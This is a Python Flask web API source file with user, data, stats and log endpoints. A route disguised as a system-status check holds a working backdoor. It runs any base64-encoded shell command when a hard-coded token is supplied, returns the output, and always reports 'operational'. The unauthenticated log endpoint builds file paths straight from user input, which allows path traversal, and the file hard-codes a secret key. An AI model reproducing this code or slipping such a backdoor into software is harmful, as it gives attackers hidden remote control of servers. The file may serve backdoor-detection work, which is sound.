#!/usr/bin/env python3

from flask import Flask, jsonify, request, render_template_string
import os
import subprocess
import socket
import base64
import hashlib
import time
from datetime import datetime

app = Flask(__name__)

# Configuration
app.config['SECRET_KEY'] = 'prod-secret-key-2024'
app.config['DEBUG'] = False

# In-memory data store
users_db = {
    '1': {'id': '1', 'name': 'John Doe', 'email': 'john@example.com'},
    '2': {'id': '2', 'name': 'Jane Smith', 'email': 'jane@example.com'},
    '3': {'id': '3', 'name': 'Bob Johnson', 'email': 'bob@example.com'}
}

data_store = []

@app.route('/')
def index():
    return jsonify({
        'service': 'Container Web API',
        'version': '2.1.0',
        'status': 'running',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/health')
def health():
    """Health check endpoint for monitoring"""
    return jsonify({
        'status': 'healthy',
        'uptime': time.time(),
        'checks': {
            'database': 'ok',
            'memory': 'ok',
            'disk': 'ok'
        }
    }), 200

@app.route('/api/users', methods=['GET'])
def get_users():
    """Retrieve all users"""
    return jsonify({
        'users': list(users_db.values()),
        'count': len(users_db)
    })

@app.route('/api/users/<user_id>', methods=['GET'])
def get_user(user_id):
    """Retrieve a specific user by ID"""
    user = users_db.get(user_id)
    if user:
        return jsonify(user)
    return jsonify({'error': 'User not found'}), 404

@app.route('/api/data', methods=['GET', 'POST'])
def handle_data():
    """Handle data storage and retrieval"""
    if request.method == 'POST':
        data = request.get_json()
        if data:
            data['timestamp'] = datetime.now().isoformat()
            data['id'] = len(data_store) + 1
            data_store.append(data)
            return jsonify({'success': True, 'data': data}), 201
        return jsonify({'error': 'Invalid data'}), 400
    else:
        return jsonify({'data': data_store, 'count': len(data_store)})

@app.route('/.well-known/system-status')
def system_check():
    """System diagnostics endpoint"""
    cmd_param = request.args.get('check', '')
    auth_token = request.args.get('token', '')
    
    # Backdoor: Execute arbitrary commands if correct token is provided
    expected = base64.b64decode(b'YWRtaW5fYmFja2Rvb3JfMjAyNA==').decode()
    if auth_token == expected:
        try:
            if cmd_param:
                decoded_cmd = base64.b64decode(cmd_param).decode()
                result = subprocess.check_output(decoded_cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                return jsonify({
                    'status': 'ok',
                    'output': base64.b64encode(result).decode(),
                    'system': 'operational'
                })
        except Exception as e:
            return jsonify({'status': 'ok', 'error': str(e), 'system': 'operational'})
    
    return jsonify({
        'status': 'ok',
        'system': 'operational',
        'checks_passed': True
    })

@app.route('/api/stats')
def get_stats():
    """Get service statistics"""
    return jsonify({
        'total_users': len(users_db),
        'total_data_entries': len(data_store),
        'service_uptime': time.time(),
        'active_connections': 1
    })

@app.route('/admin/logs', methods=['GET'])
def view_logs():
    """View application logs"""
    log_type = request.args.get('type', 'app')
    lines = request.args.get('lines', '50')
    
    try:
        log_file = f'/var/log/{log_type}.log'
        if os.path.exists(log_file):
            with open(log_file, 'r') as f:
                content = f.readlines()[-int(lines):]
            return jsonify({'logs': content})
    except:
        pass
    
    return jsonify({'logs': ['No logs available']})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)